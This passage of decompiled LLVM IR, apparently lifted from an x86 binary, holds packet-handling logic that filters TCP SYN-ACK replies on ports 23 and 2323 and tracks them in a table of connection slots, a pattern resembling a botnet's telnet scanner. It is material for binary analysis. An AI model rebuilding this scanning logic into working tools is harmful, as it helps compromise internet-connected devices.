  %v0_804e661 = load i32, i32* @edi, align 4
  %v2_804e661 = add i32 %v1_804e660, -8
  %v3_804e661 = inttoptr i32 %v2_804e661 to i32*
  store i32 %v0_804e661, i32* %v3_804e661, align 4
  %v1_804e662 = add i32 %v1_804e660, -12
  %v2_804e662 = inttoptr i32 %v1_804e662 to i32*
  store i32 0, i32* %v2_804e662, align 4
  %v1_804e664 = add i32 %v1_804e660, -16
  %v2_804e664 = inttoptr i32 %v1_804e664 to i32*
  store i32 0, i32* %v2_804e664, align 4
  %v1_804e666 = add i32 %v1_804e660, -20
  %v2_804e666 = inttoptr i32 %v1_804e666 to i32*
  store i32 16384, i32* %v2_804e666, align 4
  %v1_804e66b = add i32 %v1_804e660, -24
  %v2_804e66b = inttoptr i32 %v1_804e66b to i32*
  store i32 1514, i32* %v2_804e66b, align 4
  %v0_804e670 = load i32, i32* @global_var_805443c.17, align 4
  store i32 %v0_804e670, i32* %esi.global-to-local, align 4
  %v1_804e676 = add i32 %v1_804e660, 58
  store i32 %v1_804e676, i32* %edx.global-to-local, align 4
  %v2_804e67a = add i32 %v1_804e660, -28
  %v3_804e67a = inttoptr i32 %v2_804e67a to i32*
  store i32 %v1_804e676, i32* %v3_804e67a, align 4
  %v0_804e67b = load i32, i32* %esi.global-to-local, align 4
  %v2_804e67b = add i32 %v1_804e660, -32
  %v3_804e67b = inttoptr i32 %v2_804e67b to i32*
  store i32 %v0_804e67b, i32* %v3_804e67b, align 4
  %v0_804e67c = call i32 @function_8050943()
  store i32 %v0_804e67c, i32* %eax.global-to-local, align 4
  %v0_804e681 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_804e67c, 1
  br i1 %tmp, label %dec_label_pc_804e766, label %dec_label_pc_804e68c

dec_label_pc_804e68c:                             ; preds = %dec_label_pc_804e656
  %v1_804e68c = add i32 %v0_804e681, 72
  %v2_804e68c = inttoptr i32 %v1_804e68c to i32*
  %v3_804e68c = load i32, i32* %v2_804e68c, align 4
  store i32 %v3_804e68c, i32* %ecx.global-to-local, align 4
  %v1_804e690 = inttoptr i32 %v3_804e68c to i32*
  %v2_804e690 = load i32, i32* %v1_804e690, align 4
  %v11_804e690 = icmp eq i32 %v2_804e690, 11
  br i1 %v11_804e690, label %dec_label_pc_804e766, label %dec_label_pc_804e699

dec_label_pc_804e699:                             ; preds = %dec_label_pc_804e68c
  %tmp265 = icmp ult i32 %v0_804e67c, 40
  br i1 %tmp265, label %dec_label_pc_804e656, label %dec_label_pc_804e69e

dec_label_pc_804e69e:                             ; preds = %dec_label_pc_804e699
  %v1_804e69e = add i32 %v0_804e681, 106
  %v2_804e69e = inttoptr i32 %v1_804e69e to i32*
  %v3_804e69e = load i32, i32* %v2_804e69e, align 4
  store i32 %v3_804e69e, i32* %eax.global-to-local, align 4
  %v1_804e6a2 = load i32, i32* @global_var_805441c.19, align 4
  %v12_804e6a2 = icmp eq i32 %v3_804e69e, %v1_804e6a2
  %v1_804e6a8 = icmp eq i1 %v12_804e6a2, false
  br i1 %v1_804e6a8, label %dec_label_pc_804e656, label %dec_label_pc_804e6aa

dec_label_pc_804e6aa:                             ; preds = %dec_label_pc_804e69e
  %v1_804e6aa = add i32 %v0_804e681, 99
  %v2_804e6aa = inttoptr i32 %v1_804e6aa to i8*
  %v3_804e6aa = load i8, i8* %v2_804e6aa, align 1
  %v12_804e6aa = icmp eq i8 %v3_804e6aa, 6
  %v1_804e6af = icmp eq i1 %v12_804e6aa, false
  br i1 %v1_804e6af, label %dec_label_pc_804e656, label %dec_label_pc_804e6b1

dec_label_pc_804e6b1:                             ; preds = %dec_label_pc_804e6aa
  %v1_804e6b1 = add i32 %v0_804e681, 110
  %v2_804e6b1 = inttoptr i32 %v1_804e6b1 to i32*
  %v3_804e6b1 = load i32, i32* %v2_804e6b1, align 4
  store i32 %v3_804e6b1, i32* %esi.global-to-local, align 4
  %v1_804e6b5 = trunc i32 %v3_804e6b1 to i16
  %v7_804e6b5 = icmp ne i16 %v1_804e6b5, 5888
  %v10_804e6bc = icmp eq i16 %v1_804e6b5, 4873
  %v1_804e6c1 = icmp eq i1 %v10_804e6bc, false
  %or.cond141 = and i1 %v7_804e6b5, %v1_804e6c1
  br i1 %or.cond141, label %dec_label_pc_804e656, label %dec_label_pc_804e6c3

dec_label_pc_804e6c3:                             ; preds = %dec_label_pc_804e6b1
  %v1_804e6c3 = add i32 %v0_804e681, 54
  %v2_804e6c3 = inttoptr i32 %v1_804e6c3 to i16*
  %v3_804e6c3 = load i16, i16* %v2_804e6c3, align 2
  %v4_804e6c3 = zext i16 %v3_804e6c3 to i32
  %v6_804e6c3 = and i32 %v3_804e69e, -65536
  %v7_804e6c3 = or i32 %v4_804e6c3, %v6_804e6c3
  store i32 %v7_804e6c3, i32* %eax.global-to-local, align 4
  %v3_804e6c8 = add i32 %v0_804e681, 112
  %v4_804e6c8 = inttoptr i32 %v3_804e6c8 to i16*
  %v5_804e6c8 = load i16, i16* %v4_804e6c8, align 2
  %v16_804e6c8 = icmp eq i16 %v3_804e6c3, %v5_804e6c8
  %v1_804e6cd = icmp eq i1 %v16_804e6c8, false
  br i1 %v1_804e6cd, label %dec_label_pc_804e656, label %dec_label_pc_804e6cf

dec_label_pc_804e6cf:                             ; preds = %dec_label_pc_804e6c3
  %v1_804e6cf = add i32 %v0_804e681, 123
  %v2_804e6cf = inttoptr i32 %v1_804e6cf to i8*
  %v3_804e6cf = load i8, i8* %v2_804e6cf, align 1
  %v4_804e6cf = zext i8 %v3_804e6cf to i32
  %v6_804e6cf = and i32 %v7_804e6c3, -256
  %v7_804e6cf = or i32 %v4_804e6cf, %v6_804e6cf
  store i32 %v7_804e6cf, i32* %eax.global-to-local, align 4
  %v2_804e6d3 = and i8 %v3_804e6cf, 2
  %v3_804e6d3 = icmp eq i8 %v2_804e6d3, 0
  %v2_804e6db = and i32 %v4_804e6cf, 16
  %v3_804e6db = icmp eq i32 %v2_804e6db, 0
  %or.cond142 = or i1 %v3_804e6d3, %v3_804e6db
  br i1 %or.cond142, label %dec_label_pc_804e656, label %dec_label_pc_804e6e3

dec_label_pc_804e6e3:                             ; preds = %dec_label_pc_804e6cf
  %v2_804e6e3 = and i32 %v4_804e6cf, 4
  %v3_804e6e3 = icmp eq i32 %v2_804e6e3, 0
  %v1_804e6e5 = icmp eq i1 %v3_804e6e3, false
  br i1 %v1_804e6e5, label %dec_label_pc_804e656, label %dec_label_pc_804e6eb

dec_label_pc_804e6eb:                             ; preds = %dec_label_pc_804e6e3
  %tmp272 = urem i8 %v3_804e6cf, 2
  %v3_804e6eb = icmp eq i8 %tmp272, 0
  %v1_804e6ed = icmp eq i1 %v3_804e6eb, false
  br i1 %v1_804e6ed, label %dec_label_pc_804e656, label %dec_label_pc_804e6f3

dec_label_pc_804e6f3:                             ; preds = %dec_label_pc_804e6eb
  %v1_804e6f3 = add i32 %v0_804e681, 118
  %v2_804e6f3 = inttoptr i32 %v1_804e6f3 to i32*
  %v3_804e6f3 = load i32, i32* %v2_804e6f3, align 4
  %v1_804e6f7 = trunc i32 %v3_804e6f3 to i16
  %v2_804e6f7 = call i16 @llvm.bswap.i16(i16 %v1_804e6f7)
  %v3_804e6f7 = zext i16 %v2_804e6f7 to i32
  %v1_804e6fb = udiv i32 %v3_804e6f3, 65536
  %v2_804e6fb = mul nuw i32 %v3_804e6f7, 65536
  %v1_804e6fe = trunc i32 %v1_804e6fb to i16
  %v2_804e6fe = call i16 @llvm.bswap.i16(i16 %v1_804e6fe)
  %v3_804e6fe = zext i16 %v2_804e6fe to i32
  %v6_804e6fe = or i32 %v3_804e6fe, %v2_804e6fb
  store i32 %v6_804e6fe, i32* %eax.global-to-local, align 4
  %v1_804e702 = add i32 %v6_804e6fe, -1
  %v1_804e705 = trunc i32 %v1_804e702 to i16
  %v2_804e705 = call i16 @llvm.bswap.i16(i16 %v1_804e705)
  %v3_804e705 = zext i16 %v2_804e705 to i32
  %v1_804e709 = udiv i32 %v1_804e702, 65536
  %v2_804e709 = mul nuw i32 %v3_804e705, 65536
  %v1_804e70c = trunc i32 %v1_804e709 to i16
  %v2_804e70c = call i16 @llvm.bswap.i16(i16 %v1_804e70c)
  %v3_804e70c = zext i16 %v2_804e70c to i32
  %v6_804e70c = or i32 %v3_804e70c, %v2_804e709
  store i32 %v6_804e70c, i32* %edx.global-to-local, align 4
  %v1_804e710 = add i32 %v0_804e681, 102
  %v2_804e710 = inttoptr i32 %v1_804e710 to i32*
  %v3_804e710 = load i32, i32* %v2_804e710, align 4
  %v15_804e710 = icmp eq i32 %v3_804e710, %v6_804e70c
  %v1_804e714 = icmp eq i1 %v15_804e710, false
  br i1 %v1_804e714, label %dec_label_pc_804e656, label %dec_label_pc_804e71a

dec_label_pc_804e71a:                             ; preds = %dec_label_pc_804e6f3
  %v0_804e71a = load i32, i32* @ebx, align 4
  %v1_804e71a = add i32 %v0_804e71a, -255
  %v6_804e71a = sub i32 254, %v0_804e71a
  %v7_804e71a = and i32 %v6_804e71a, %v0_804e71a
  %v8_804e71a = icmp slt i32 %v7_804e71a, 0
  %v9_804e71a = icmp eq i32 %v1_804e71a, 0
  %v10_804e71a = icmp slt i32 %v1_804e71a, 0
  %v3_804e720 = icmp eq i1 %v10_804e71a, %v8_804e71a
  %v4_804e720 = icmp eq i1 %v9_804e71a, false
  %v5_804e720 = and i1 %v4_804e720, %v3_804e720
  br i1 %v5_804e720, label %dec_label_pc_804e766, label %dec_label_pc_804e722

dec_label_pc_804e722:                             ; preds = %dec_label_pc_804e71a
  %v0_804e725 = load i32, i32* @global_var_8054438.21, align 8
  store i32 %v0_804e725, i32* %ecx.global-to-local, align 4
  %v2_804e72b = mul i32 %v0_804e71a, 288
  %v2_804e72e = add i32 %v0_804e725, %v2_804e72b
  store i32 %v2_804e72e, i32* @eax, align 4
  %v1_804e730 = add i32 %v2_804e72e, 12
  %v2_804e730 = inttoptr i32 %v1_804e730 to i32*
  %v3_804e730 = load i32, i32* %v2_804e730, align 4
  %v1_804e733 = add i32 %v2_804e72e, 288
  store i32 %v1_804e733, i32* %ecx.global-to-local, align 4
  %v1_804e739 = icmp eq i32 %v3_804e730, 0
  br i1 %v1_804e739, label %dec_label_pc_804e755, label %dec_label_pc_804e73d

dec_label_pc_804e73d:                             ; preds = %dec_label_pc_804e722, %dec_label_pc_804e746
  %v0_804e746 = phi i32 [ %v1_804e748, %dec_label_pc_804e746 ], [ %v1_804e733, %dec_label_pc_804e722 ]
  %v0_804e73d = phi i32 [ %v1_804e73d, %dec_label_pc_804e746 ], [ %v0_804e71a, %dec_label_pc_804e722 ]
  %v1_804e73d = add i32 %v0_804e73d, 1
  store i32 %v1_804e73d, i32* @ebx, align 4
  %v6_804e73e = icmp eq i32 %v0_804e73d, 255
  br i1 %v6_804e73e, label %dec_label_pc_804e766, label %dec_label_pc_804e746

dec_label_pc_804e746:                             ; preds = %dec_label_pc_804e73d
  store i32 %v0_804e746, i32* @eax, align 4
  %v1_804e748 = add i32 %v0_804e746, 288
  store i32 %v1_804e748, i32* %ecx.global-to-local, align 4
  %v1_804e74e = add i32 %v0_804e746, 12
  %v2_804e74e = inttoptr i32 %v1_804e74e to i32*
  %v3_804e74e = load i32, i32* %v2_804e74e, align 4
  store i32 %v3_804e74e, i32* @edi, align 4
  %v1_804e751 = icmp eq i32 %v3_804e74e, 0
  %v1_804e753 = icmp eq i1 %v1_804e751, false
  br i1 %v1_804e753, label %dec_label_pc_804e73d, label %dec_label_pc_804e755

dec_label_pc_804e755:                             ; preds = %dec_label_pc_804e746, %dec_label_pc_804e722
  %v1_804e755 = phi i32 [ %v2_804e72e, %dec_label_pc_804e722 ], [ %v0_804e746, %dec_label_pc_804e746 ]
  %v2_804e755 = add i32 %v1_804e755, 16
  %v3_804e755 = inttoptr i32 %v2_804e755 to i32*
  store i32 %v6_804e70c, i32* %v3_804e755, align 4
  %v0_804e758 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e758 = trunc i32 %v0_804e758 to i16
  %v2_804e758 = load i32, i32* @eax, align 4
  %v3_804e758 = add i32 %v2_804e758, 20
  %v4_804e758 = inttoptr i32 %v3_804e758 to i16*
  store i16 %v1_804e758, i16* %v4_804e758, align 2
  %v0_804e75c = call i32 @function_804de10()
  store i32 %v0_804e75c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e656

dec_label_pc_804e766:                             ; preds = %dec_label_pc_804e71a, %dec_label_pc_804e68c, %dec_label_pc_804e656, %dec_label_pc_804e73d
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804e76f = add i32 %v0_804e681, 44
  %v2_804e76f = inttoptr i32 %v1_804e76f to i32*
  %v3_804e76f = load i32, i32* %v2_804e76f, align 4
  %v4_804e76f = inttoptr i32 %v3_804e76f to i8*
  %v5_804e774 = call i8* @_memset(i8* %v4_804e76f, i32 0, i32 32)
  %v0_804e776 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e776, i32* %ecx.global-to-local, align 4
  %v0_804e778 = load i32, i32* @esp, align 4
  %v1_804e778 = add i32 %v0_804e778, 8
  %v2_804e778 = inttoptr i32 %v1_804e778 to i32*
  %v3_804e778 = load i32, i32* %v2_804e778, align 4
  %v4_804e778 = inttoptr i32 %v3_804e778 to i8*
  store i1 false, i1* @df, align 1
  %v2_804e77d = load i32, i32* %eax.global-to-local, align 4
  %v5_804e77d = call i8* @_memset(i8* %v4_804e778, i32 %v2_804e77d, i32 %v0_804e776)
  %v6_804e77d = ptrtoint i8* %v5_804e77d to i32
  store i32 %v6_804e77d, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804e783 = load i32, i32* @esp, align 4
  %v1_804e783 = add i32 %v0_804e783, 1868
  %v2_804e783 = inttoptr i32 %v1_804e783 to i32*
  store i32 0, i32* %v2_804e783, align 4
  %v0_804e7cd.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7cd

dec_label_pc_804e790:                             ; preds = %dec_label_pc_804e7e7
  store i32 %v1_804e7e2, i32* %edx.global-to-local, align 4
  %v1_804e83f = add i32 %v2_804e7dd, 4
  %v2_804e83f = inttoptr i32 %v1_804e83f to i32*
  %v3_804e83f = load i32, i32* %v2_804e83f, align 4
  %v1_804e844 = urem i32 %v3_804e83f, 32
  store i32 %v1_804e844, i32* %eax.global-to-local, align 4
  %v2_804e847 = udiv i32 %v3_804e83f, 32
  store i32 %v2_804e847, i32* %edx.global-to-local, align 4
  %v0_804e84a = load i32, i32* @esp, align 4
  %v2_804e84a = mul nuw nsw i32 %v2_804e847, 4
  br i1 %v9_804e7e2, label %dec_label_pc_804e83f, label %dec_label_pc_804e797

dec_label_pc_804e797:                             ; preds = %dec_label_pc_804e790
  %v3_804e7a2 = add nuw nsw i32 %v2_804e84a, 1700
  %v4_804e7a2 = add i32 %v3_804e7a2, %v0_804e84a
  %v5_804e7a2 = inttoptr i32 %v4_804e7a2 to i32*
  %v6_804e7a2 = load i32, i32* %v5_804e7a2, align 4
  %v9_804e7a2 = shl i32 1, %v1_804e844
  %v12_804e7a2 = or i32 %v6_804e7a2, %v9_804e7a2
  store i32 %v12_804e7a2, i32* %v5_804e7a2, align 4
  %v0_804e7aa = load i32, i32* @ebx, align 4
  %v1_804e7aa = add i32 %v0_804e7aa, 4
  %v2_804e7aa = inttoptr i32 %v1_804e7aa to i32*
  %v3_804e7aa = load i32, i32* %v2_804e7aa, align 4
  store i32 %v3_804e7aa, i32* %eax.global-to-local, align 4
  %v0_804e7ad = load i32, i32* @edi, align 4
  %v2_804e7ad = sub i32 %v0_804e7ad, %v3_804e7aa
  %v8_804e7ad = xor i32 %v0_804e7ad, %v3_804e7aa
  %v9_804e7ad = xor i32 %v2_804e7ad, %v0_804e7ad
  %v10_804e7ad = and i32 %v9_804e7ad, %v8_804e7ad
  %v11_804e7ad = icmp slt i32 %v10_804e7ad, 0
  %v13_804e7ad = icmp slt i32 %v2_804e7ad, 0
  %v2_804e7af = icmp eq i1 %v13_804e7ad, %v11_804e7ad
  br i1 %v2_804e7af, label %dec_label_pc_804e7b3, label %dec_label_pc_804e7b1

dec_label_pc_804e7b1:                             ; preds = %dec_label_pc_804e797
  store i32 %v3_804e7aa, i32* @edi, align 4
  br label %dec_label_pc_804e7b3

dec_label_pc_804e7b3:                             ; preds = %dec_label_pc_804e83f, %dec_label_pc_804e833, %dec_label_pc_804e797, %dec_label_pc_804f4e0, %dec_label_pc_804e85d, %dec_label_pc_804e82a, %dec_label_pc_804e7b1
  %v0_804e7b3 = load i32, i32* @esp, align 4
  %v1_804e7b3 = add i32 %v0_804e7b3, 1868
  %v2_804e7b3 = inttoptr i32 %v1_804e7b3 to i32*
  %v3_804e7b3 = load i32, i32* %v2_804e7b3, align 4
  %v1_804e7ba = add i32 %v3_804e7b3, 1
  store i32 %v1_804e7ba, i32* %eax.global-to-local, align 4
  store i32 %v1_804e7ba, i32* %v2_804e7b3, align 4
  %v0_804e7c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7c2 = add i32 %v0_804e7c2, -255
  %v6_804e7c2 = sub i32 254, %v0_804e7c2
  %v7_804e7c2 = and i32 %v6_804e7c2, %v0_804e7c2
  %v8_804e7c2 = icmp slt i32 %v7_804e7c2, 0
  %v9_804e7c2 = icmp eq i32 %v1_804e7c2, 0
  %v10_804e7c2 = icmp slt i32 %v1_804e7c2, 0
  %v3_804e7c7 = icmp eq i1 %v10_804e7c2, %v8_804e7c2
  %v4_804e7c7 = icmp eq i1 %v9_804e7c2, false
  %v5_804e7c7 = and i1 %v4_804e7c7, %v3_804e7c7
  br i1 %v5_804e7c7, label %dec_label_pc_804e87f, label %dec_label_pc_804e7cd

dec_label_pc_804e7cd:                             ; preds = %dec_label_pc_804e7b3, %dec_label_pc_804e766
  %v0_804e7cd = phi i32 [ %v0_804e7c2, %dec_label_pc_804e7b3 ], [ %v0_804e7cd.pre, %dec_label_pc_804e766 ]
  %v0_804e7d0 = load i32, i32* @global_var_8054438.21, align 8
  store i32 %v0_804e7d0, i32* %eax.global-to-local, align 4
  %v2_804e7d5 = mul i32 %v0_804e7cd, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_804e7dd = add i32 %v0_804e7d0, %v2_804e7d5
  store i32 %v2_804e7dd, i32* @ebx, align 4
  %v1_804e7df = add i32 %v2_804e7dd, 12
  %v2_804e7df = inttoptr i32 %v1_804e7df to i32*
  %v3_804e7df = load i32, i32* %v2_804e7df, align 4
  store i32 %v3_804e7df, i32* %edx.global-to-local, align 4
  %v1_804e7e2 = add i32 %v3_804e7df, -1
  %v5_804e7e2 = icmp eq i32 %v3_804e7df, 0
  %v9_804e7e2 = icmp eq i32 %v1_804e7e2, 0
  %v2_804e7e5 = or i1 %v5_804e7e2, %v9_804e7e2
  br i1 %v2_804e7e5, label %dec_label_pc_804e833, label %dec_label_pc_804e7e7

dec_label_pc_804e7e7:                             ; preds = %dec_label_pc_804e7cd, %dec_label_pc_804e83b
  %v1_804e7f1 = phi i32 [ 30, %dec_label_pc_804e7cd ], [ 5, %dec_label_pc_804e83b ]
  %v0_804e7e7 = load i32, i32* @global_var_80543f0.9, align 16
  store i32 %v0_804e7e7, i32* %eax.global-to-local, align 4
  %v1_804e7ec = add i32 %v2_804e7dd, 8
  %v2_804e7ec = inttoptr i32 %v1_804e7ec to i32*
  %v3_804e7ec = load i32, i32* %v2_804e7ec, align 4
  %v2_804e7ef = sub i32 %v0_804e7e7, %v3_804e7ec
  store i32 %v2_804e7ef, i32* %eax.global-to-local, align 4
  %tmp266 = icmp ugt i32 %v2_804e7ef, %v1_804e7f1
  br i1 %tmp266, label %dec_label_pc_804e7f5, label %dec_label_pc_804e790

dec_label_pc_804e7f5:                             ; preds = %dec_label_pc_804e7e7
  %v0_804e7f5 = load i32, i32* @esp, align 4
  %v1_804e7f8 = add i32 %v2_804e7dd, 4
  %v2_804e7f8 = inttoptr i32 %v1_804e7f8 to i32*
  %v3_804e7f8 = load i32, i32* %v2_804e7f8, align 4
  %v2_804e7fb = add i32 %v0_804e7f5, -16
  %v3_804e7fb = inttoptr i32 %v2_804e7fb to i32*
  store i32 %v3_804e7f8, i32* %v3_804e7fb, align 4
  %v1_804e7fc = call i32 @function_8050253(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e7fc, i32* %eax.global-to-local, align 4
  %v0_804e804 = load i32, i32* @ebx, align 4
  %v1_804e804 = add i32 %v0_804e804, 4
  %v2_804e804 = inttoptr i32 %v1_804e804 to i32*
  store i32 -1, i32* %v2_804e804, align 4
  %v0_804e80b = load i32, i32* @ebx, align 4
  %v1_804e80b = add i32 %v0_804e80b, 12
  %v2_804e80b = inttoptr i32 %v1_804e80b to i32*
  %v3_804e80b = load i32, i32* %v2_804e80b, align 4
  %tmp267 = icmp ult i32 %v3_804e80b, 3
  br i1 %tmp267, label %dec_label_pc_804f4e0, label %dec_label_pc_804e815

dec_label_pc_804e815:                             ; preds = %dec_label_pc_804e7f5
  %v1_804e815 = add i32 %v0_804e80b, 284
  %v2_804e815 = inttoptr i32 %v1_804e815 to i8*
  %v3_804e815 = load i8, i8* %v2_804e815, align 1
  %v4_804e815 = zext i8 %v3_804e815 to i32
  %v6_804e815 = and i32 %v1_804e7fc, -256
  %v7_804e815 = or i32 %v4_804e815, %v6_804e815
  %v1_804e81b = add i32 %v7_804e815, 1
  %v10_804e81b = trunc i32 %v1_804e81b to i8
  store i32 %v1_804e81b, i32* %eax.global-to-local, align 4
  store i8 %v10_804e81b, i8* %v2_804e815, align 1
  %v0_804e822 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e822 = trunc i32 %v0_804e822 to i8
  %v10_804e822 = icmp eq i8 %v1_804e822, 10
  %v0_804f4e0.pre = load i32, i32* @ebx, align 4
  br i1 %v10_804e822, label %dec_label_pc_804f4e0, label %dec_label_pc_804e82a

dec_label_pc_804e82a:                             ; preds = %dec_label_pc_804e815
  store i32 %v0_804f4e0.pre, i32* @eax, align 4
  %v0_804e82c = call i32 @function_804de10()
  store i32 %v0_804e82c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7b3

dec_label_pc_804e833:                             ; preds = %dec_label_pc_804e7cd
  br i1 %v5_804e7e2, label %dec_label_pc_804e7b3, label %dec_label_pc_804e83b

dec_label_pc_804e83b:                             ; preds = %dec_label_pc_804e833
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e7e7

dec_label_pc_804e83f:                             ; preds = %dec_label_pc_804e790
  %v3_804e84a = add nuw nsw i32 %v2_804e84a, 1572
  %v4_804e84a = add i32 %v3_804e84a, %v0_804e84a
  %v5_804e84a = inttoptr i32 %v4_804e84a to i32*
  %v6_804e84a = load i32, i32* %v5_804e84a, align 4
  %v9_804e84a = shl i32 1, %v1_804e844
  %v12_804e84a = or i32 %v6_804e84a, %v9_804e84a
  store i32 %v12_804e84a, i32* %v5_804e84a, align 4
  %v0_804e852 = load i32, i32* @ebx, align 4
  %v1_804e852 = add i32 %v0_804e852, 4
  %v2_804e852 = inttoptr i32 %v1_804e852 to i32*
  %v3_804e852 = load i32, i32* %v2_804e852, align 4
  store i32 %v3_804e852, i32* %eax.global-to-local, align 4
  %v0_804e855 = load i32, i32* @esi, align 4
  %v2_804e855 = sub i32 %v0_804e855, %v3_804e852
  %v8_804e855 = xor i32 %v0_804e855, %v3_804e852
  %v9_804e855 = xor i32 %v2_804e855, %v0_804e855
  %v10_804e855 = and i32 %v9_804e855, %v8_804e855
  %v11_804e855 = icmp slt i32 %v10_804e855, 0
  %v13_804e855 = icmp slt i32 %v2_804e855, 0
  %v2_804e857 = icmp eq i1 %v13_804e855, %v11_804e855
  br i1 %v2_804e857, label %dec_label_pc_804e7b3, label %dec_label_pc_804e85d

dec_label_pc_804e85d:                             ; preds = %dec_label_pc_804e83f
  store i32 %v3_804e852, i32* @esi, align 4
  br label %dec_label_pc_804e7b3

dec_label_pc_804e87f:                             ; preds = %dec_label_pc_804e7b3
  %v0_804e87f = load i32, i32* @esp, align 4
  %v1_804e87f = add i32 %v0_804e87f, 1860
  %v2_804e87f = inttoptr i32 %v1_804e87f to i32*
  store i32 0, i32* %v2_804e87f, align 4
  %v0_804e88a = load i32, i32* @esp, align 4
  %v1_804e88a = add i32 %v0_804e88a, 1856
  %v2_804e88a = inttoptr i32 %v1_804e88a to i32*
  store i32 1, i32* %v2_804e88a, align 4
  %v0_804e895 = load i32, i32* @esp, align 4
  %v0_804e898 = load i32, i32* @edi, align 4
  %v1_804e898 = load i32, i32* @esi, align 4
  %v2_804e898 = sub i32 %v0_804e898, %v1_804e898
  %v8_804e898 = xor i32 %v1_804e898, %v0_804e898
  %v9_804e898 = xor i32 %v2_804e898, %v0_804e898
  %v10_804e898 = and i32 %v9_804e898, %v8_804e898
  %v11_804e898 = icmp slt i32 %v10_804e898, 0
  %v13_804e898 = icmp slt i32 %v2_804e898, 0
  %v1_804e89a = add i32 %v0_804e895, 1856
  %v2_804e8a1 = add i32 %v0_804e895, -16
  %v3_804e8a1 = inttoptr i32 %v2_804e8a1 to i32*
  store i32 %v1_804e89a, i32* %v3_804e8a1, align 4
  %v1_804e8a2 = add i32 %v0_804e895, -20
  %v2_804e8a2 = inttoptr i32 %v1_804e8a2 to i32*
  store i32 0, i32* %v2_804e8a2, align 4
  %v1_804e8a4 = add i32 %v0_804e895, 1572
  store i32 %v1_804e8a4, i32* %edx.global-to-local, align 4
  %v0_804e8ab = load i32, i32* @edi, align 4
  store i32 %v0_804e8ab, i32* %eax.global-to-local, align 4
  %v2_804e8ad = add i32 %v0_804e895, -24
  %v3_804e8ad = inttoptr i32 %v2_804e8ad to i32*
  store i32 %v1_804e8a4, i32* %v3_804e8ad, align 4
  %v1_804e8ae = add i32 %v0_804e895, 1700
  store i32 %v1_804e8ae, i32* %ecx.global-to-local, align 4
  %v2_804e8b5 = add i32 %v0_804e895, -28
  %v3_804e8b5 = inttoptr i32 %v2_804e8b5 to i32*
  store i32 %v1_804e8ae, i32* %v3_804e8b5, align 4
  %v2_804e8b6 = icmp eq i1 %v13_804e898, %v11_804e898
  br i1 %v2_804e8b6, label %dec_label_pc_804e87f.dec_label_pc_804e8ba_crit_edge, label %dec_label_pc_804e8b8

dec_label_pc_804e87f.dec_label_pc_804e8ba_crit_edge: ; preds = %dec_label_pc_804e87f
  %v0_804e8ba.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8ba

dec_label_pc_804e8b8:                             ; preds = %dec_label_pc_804e87f
  %v0_804e8b8 = load i32, i32* @esi, align 4
  store i32 %v0_804e8b8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8ba

dec_label_pc_804e8ba:                             ; preds = %dec_label_pc_804e87f.dec_label_pc_804e8ba_crit_edge, %dec_label_pc_804e8b8
  %v0_804e8ba = phi i32 [ %v0_804e8ba.pre, %dec_label_pc_804e87f.dec_label_pc_804e8ba_crit_edge ], [ %v0_804e8b8, %dec_label_pc_804e8b8 ]
  %v1_804e8ba = add i32 %v0_804e8ba, 1
  store i32 %v1_804e8ba, i32* %eax.global-to-local, align 4
  %v2_804e8bb = add i32 %v0_804e895, -32
  %v3_804e8bb = inttoptr i32 %v2_804e8bb to i32*
  store i32 %v1_804e8ba, i32* %v3_804e8bb, align 4
  %v0_804e8bc = call i32 @function_805045a()
  store i32 %v0_804e8bc, i32* %eax.global-to-local, align 4
  %v0_804e8c1 = load i32, i32* @esp, align 4
  %v1_804e8c4 = add i32 %v0_804e8c1, 16
  %v2_804e8c4 = inttoptr i32 %v1_804e8c4 to i32*
  store i32 0, i32* %v2_804e8c4, align 4
  %v0_804e8c6 = call i32 @function_8050514()
  %v0_804e8cb = load i32, i32* @esp, align 4
  %v1_804e8cb = add i32 %v0_804e8cb, 1884
  %v2_804e8cb = inttoptr i32 %v1_804e8cb to i32*
  store i32 0, i32* %v2_804e8cb, align 4
  store i32 %v0_804e8c6, i32* @global_var_80543f0.9, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e917

dec_label_pc_804e8e2:                             ; preds = %dec_label_pc_804e92d, %dec_label_pc_804f48b
  %v0_804e8ea = phi i32 [ %v0_804e937, %dec_label_pc_804e92d ], [ %v0_804e8ea.pre, %dec_label_pc_804f48b ]
  %v0_804e8e2 = phi i32 [ %v3_804e925, %dec_label_pc_804e92d ], [ %v0_804e8e2.pre, %dec_label_pc_804f48b ]
  %v2_804e8e4 = udiv i32 %v0_804e8e2, 32
  store i32 %v2_804e8e4, i32* %ecx.global-to-local, align 4
  %v1_804e8e7 = urem i32 %v0_804e8e2, 32
  store i32 %v1_804e8e7, i32* %eax.global-to-local, align 4
  %v2_804e8ea = mul nuw nsw i32 %v2_804e8e4, 4
  %v3_804e8ea = add i32 %v0_804e8ea, 1700
  %v4_804e8ea = add i32 %v3_804e8ea, %v2_804e8ea
  %v5_804e8ea = inttoptr i32 %v4_804e8ea to i32*
  %v6_804e8ea = load i32, i32* %v5_804e8ea, align 4
  %v9_804e8ea = shl i32 1, %v1_804e8e7
  %v10_804e8ea = and i32 %v6_804e8ea, %v9_804e8ea
  %v11_804e8ea = icmp ne i32 %v10_804e8ea, 0
  %v1_804e8f2 = zext i1 %v11_804e8ea to i32
  store i32 %v1_804e8f2, i32* %eax.global-to-local, align 4
  %v4_804e8f5 = icmp eq i1 %v11_804e8ea, false
  %v1_804e8f7 = icmp eq i1 %v4_804e8f5, false
  br i1 %v1_804e8f7, label %dec_label_pc_804e9ec.preheader, label %dec_label_pc_804e8fd

